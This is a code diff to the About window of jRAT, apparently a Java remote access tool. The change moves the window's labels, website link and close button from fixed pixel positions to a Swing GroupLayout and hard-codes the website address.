@@ -23,11 +23,14 @@ import pro.jrat.Constants;
 import pro.jrat.Main;
 import pro.jrat.common.Version;
 import pro.jrat.utils.NetworkUtils;
+import javax.swing.GroupLayout;
+import javax.swing.GroupLayout.Alignment;
+import javax.swing.LayoutStyle.ComponentPlacement;
 
 
 
 @SuppressWarnings("serial")
-public class FrameAbout extends BaseFrame {
+public class FrameAbout extends JFrame {
 	
 	public static Image BACKGROUND;
 	
@@ -49,7 +52,7 @@ public class FrameAbout extends BaseFrame {
 		setTitle("About jRAT BETA " + Version.getVersion());
 		setResizable(false);
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
-		setBounds(100, 100, 386, 300);
+		setBounds(100, 100, 450, 300);
 		contentPane = new JPanel() {
 			@Override
 			public void paintComponent(Graphics g) {
@@ -68,7 +71,6 @@ public class FrameAbout extends BaseFrame {
 		}
 
 		JButton btnClose = new JButton("Close");
-		btnClose.setBounds(283, 236, 79, 25);
 		btnClose.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				setVisible(false);
@@ -78,21 +80,16 @@ public class FrameAbout extends BaseFrame {
 		btnClose.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/delete.png")));
 		
 		JLabel lblJrat = new JLabel("jRAT " + Version.getVersion());
-		lblJrat.setBounds(186, 11, 125, 31);
 		lblJrat.setFont(new Font("Tahoma", Font.PLAIN, 25));
 		
 		JLabel lblPointOfOrigin = new JLabel("Point of origin:");
-		lblPointOfOrigin.setBounds(186, 149, 70, 14);
 		
 		JLabel lblSweden = new JLabel("Sweden");
-		lblSweden.setBounds(262, 149, 58, 14);
 		lblSweden.setIcon(new ImageIcon(FrameAbout.class.getResource("/flags/se.png")));
 		
 		JLabel lblWebsite = new JLabel("Website:");
-		lblWebsite.setBounds(213, 170, 43, 14);
 		
-		JLabel lblHttpredpoisncom = new JLabel(Constants.HOST);
-		lblHttpredpoisncom.setBounds(262, 169, 94, 16);
+		JLabel lblHttpredpoisncom = new JLabel("http://jrat.pro");
 		lblHttpredpoisncom.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mouseClicked(MouseEvent arg0) {
@@ -103,10 +100,8 @@ public class FrameAbout extends BaseFrame {
 		lblHttpredpoisncom.setForeground(Color.BLUE);
 		
 		JLabel lblWrittenBy = new JLabel("Written by:");
-		lblWrittenBy.setBounds(201, 192, 55, 14);
 		
 		JLabel lblRedpoisn = new JLabel("redpois0n (.com)");
-		lblRedpoisn.setBounds(262, 191, 101, 16);
 		lblRedpoisn.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mouseClicked(MouseEvent arg0) {
@@ -115,16 +110,56 @@ public class FrameAbout extends BaseFrame {
 		});
 		lblRedpoisn.setIcon(new ImageIcon(FrameAbout.class.getResource("/icons/action_disconnect.png")));
 		lblRedpoisn.setForeground(Color.RED);
-
-		contentPane.setLayout(null);
-		contentPane.add(btnClose);
-		contentPane.add(lblJrat);
-		contentPane.add(lblWebsite);
-		contentPane.add(lblPointOfOrigin);
-		contentPane.add(lblWrittenBy);
-		contentPane.add(lblRedpoisn);
-		contentPane.add(lblHttpredpoisncom);
-		contentPane.add(lblSweden);
+		GroupLayout gl_contentPane = new GroupLayout(contentPane);
+		gl_contentPane.setHorizontalGroup(
+			gl_contentPane.createParallelGroup(Alignment.TRAILING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addComponent(lblJrat)
+						.addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup()
+							.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
+								.addGroup(gl_contentPane.createSequentialGroup()
+									.addPreferredGap(ComponentPlacement.RELATED, 172, GroupLayout.PREFERRED_SIZE)
+									.addComponent(btnClose, GroupLayout.PREFERRED_SIZE, 79, GroupLayout.PREFERRED_SIZE)
+									.addPreferredGap(ComponentPlacement.RELATED))
+								.addGroup(gl_contentPane.createSequentialGroup()
+									.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
+										.addComponent(lblPointOfOrigin)
+										.addComponent(lblWebsite, GroupLayout.PREFERRED_SIZE, 95, GroupLayout.PREFERRED_SIZE)
+										.addComponent(lblWrittenBy, GroupLayout.PREFERRED_SIZE, 95, GroupLayout.PREFERRED_SIZE))
+									.addGap(18)
+									.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+										.addComponent(lblSweden, GroupLayout.PREFERRED_SIZE, 109, GroupLayout.PREFERRED_SIZE)
+										.addGroup(gl_contentPane.createSequentialGroup()
+											.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false)
+												.addComponent(lblHttpredpoisncom, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+												.addComponent(lblRedpoisn, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 138, Short.MAX_VALUE))
+											.addPreferredGap(ComponentPlacement.RELATED)))))
+							.addContainerGap())))
+		);
+		gl_contentPane.setVerticalGroup(
+			gl_contentPane.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addGap(6)
+					.addComponent(lblJrat)
+					.addGap(118)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
+						.addComponent(lblSweden, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE)
+						.addComponent(lblPointOfOrigin, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE))
+					.addPreferredGap(ComponentPlacement.UNRELATED)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addComponent(lblWebsite, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE)
+						.addComponent(lblHttpredpoisncom))
+					.addGap(7)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(lblRedpoisn)
+						.addComponent(lblWrittenBy, GroupLayout.PREFERRED_SIZE, 14, GroupLayout.PREFERRED_SIZE))
+					.addPreferredGap(ComponentPlacement.UNRELATED)
+					.addComponent(btnClose, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
+					.addContainerGap())
+		);
+		contentPane.setLayout(gl_contentPane);
 
 		Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
 		int w = getSize().width;
